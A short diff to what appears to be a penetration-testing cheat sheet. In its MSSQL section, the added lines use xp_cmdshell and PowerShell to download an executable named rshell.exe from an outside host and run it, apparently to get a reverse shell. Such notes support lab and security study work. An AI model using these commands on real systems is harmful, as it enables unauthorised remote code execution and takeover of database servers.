@@ -892,6 +892,10 @@ reconfigure
 go
 xp_cmdshell 'whoami'
 go
+xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
+go
+xp_cmdshell 'c:\Users\Public\reverse.exe"'
+go
 ````
 #### NFS port 2049
 ##### Enumeration
